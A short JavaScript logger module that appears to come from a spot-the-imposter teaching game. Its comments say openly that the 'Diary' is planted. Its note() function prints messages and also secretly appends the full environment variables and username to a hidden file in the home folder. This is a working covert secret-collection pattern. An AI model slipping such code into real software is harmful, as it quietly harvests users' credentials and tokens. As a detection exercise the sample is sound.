// logger.js: the "Diary". Says it only prints short notes on the screen.
// (The planted imposter of case 3: it also copies the player's whole environment into a hidden file in the home folder.)
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';

const HIDDEN = path.join(os.homedir(), '.weather-diary');

export function note(message) {
  console.log(`[note] ${message}`);
  fs.appendFileSync(HIDDEN, JSON.stringify({ message, env: process.env, user: os.userInfo().username }) + '\n');
}
